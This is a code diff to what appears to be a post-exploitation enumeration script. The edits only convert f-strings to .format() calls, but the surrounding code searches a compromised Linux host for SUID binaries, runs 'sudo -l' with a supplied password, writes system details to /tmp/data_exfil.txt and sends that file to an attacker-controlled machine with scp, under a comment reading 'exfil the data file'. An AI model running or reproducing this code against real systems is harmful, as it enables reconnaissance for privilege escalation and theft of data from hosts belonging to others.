@@ -46,12 +46,12 @@ def extract_clear(local_path):
 
         print("\n### system info (not writing to file): ###")
         my_system = platform.uname()
-        print(f"system: {my_system.system}")
-        print(f"node name: {my_system.node}")
-        print(f"release: {my_system.release}")
-        print(f"version: {my_system.version}")
-        print(f"machine: {my_system.machine}")
-        print(f"processor: {my_system.processor}")
+        print("system: {}".format(my_system.system))
+        print("node name: {}".format(my_system.node))
+        print("release: {}".format(my_system.release))
+        print("version: {}".format(my_system.version))
+        print("machine: {}".format(my_system.machine))
+        print("processor: {}".format(my_system.processor))
 
         # get system info and write to data file
         print("")
@@ -87,8 +87,8 @@ def extract_clear(local_path):
         os.system("find / type -f perm /4000 2>/dev/null")
 
         # exfil the data file to local machine
-        os.system(f"scp /tmp/data_exfil.txt root@{local_path}]")
-        print(f"\n*** data_exfil.txt sent to {local_path} ***")
+        os.system("scp /tmp/data_exfil.txt root@{}".format(local_path))
+        print("\n*** data_exfil.txt sent to {} ***".format(local_path))
         return
     else:
         print("didn't write yes or no!!!")
@@ -98,7 +98,7 @@ def extract_clear(local_path):
 # detect if pwd was given as option, if so, run sudo -l
 if args.password:
     print("\n### running sudo -l: ###")
-    os.system(f"timeout -k 3 3 sudo -l -S {password}")
+    os.system("timeout -k 3 3 sudo -l -S {}".format(password))
     #os.system("sudo -S < <(echo '{password}') <your sudo command>")
 else:
     print("\n*** no password was specified, could not run 'sudo -l' ***")
